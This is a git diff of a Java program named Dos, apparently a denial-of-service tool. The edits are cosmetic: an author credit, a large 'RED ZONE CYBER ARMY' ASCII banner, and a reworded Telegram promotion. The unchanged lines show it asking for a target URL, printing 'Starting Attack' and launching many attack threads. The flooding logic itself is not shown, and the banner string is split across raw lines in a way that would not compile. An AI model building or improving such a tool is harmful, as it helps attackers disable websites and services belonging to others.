@@ -3,7 +3,7 @@ import java.net.*;
 import java.net.URL;
 import java.net.URL;
 
-import java.util.Scanner;                   // MAKED BY OXiZ3N  :)
+import java.util.Scanner;                   // Made By OXiZ3N :)
 import java.util.ArrayList;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -2223,7 +2223,12 @@ public class Dos implements Runnable {
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("\u001B[35m ********************> Maked By OXiZ3N<********************* \u001B[35m"+'\n'+" \u001B[35m ENTER Target URL:\u001B[35m");
+        System.out.print("\u001B[35m  _____  ______ _____    __________  _   _ ______    _______     ______  ______ _____             _____  __  ____     __
+                                     |  __ \|  ____|  __ \  |___  / __ \| \ | |  ____|  / ____\ \   / /  _ \|  ____|  __ \      /\   |  __ \|  \/  \ \   / /
+                                     | |__) | |__  | |  | |    / / |  | |  \| | |__    | |     \ \_/ /| |_) | |__  | |__) |    /  \  | |__) | \  / |\ \_/ / 
+                                     |  _  /|  __| | |  | |   / /| |  | | . ` |  __|   | |      \   / |  _ <|  __| |  _  /    / /\ \ |  _  /| |\/| | \   /  
+                                     | | \ \| |____| |__| |  / /_| |__| | |\  | |____  | |____   | |  | |_) | |____| | \ \   / ____ \| | \ \| |  | |  | |   
+                                     |_|  \_\______|_____/  /_____\____/|_| \_|______|  \_____|  |_|  |____/|______|_|  \_\ /_/    \_\_|  \_\_|  |_|  |_|     \u001B[35m"+'\n'+" \u001B[35m ENTER Target URL:\u001B[35m");
         url = in.nextLine();
         System.out.println("\n");
         System.out.println("Starting Attack to url: " + url);
@@ -2257,7 +2262,7 @@ public class Dos implements Runnable {
         Thread.sleep(2000);
 
 
-        System.out.println("\u001B[34m STARTING ATTACK - Telegram : t.me/OXiZ3N");
+        System.out.println("\u001B[34m STARTING ATTACK - Our Telegram : t.me/OXiZ3N");
         System.out.println("\n");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
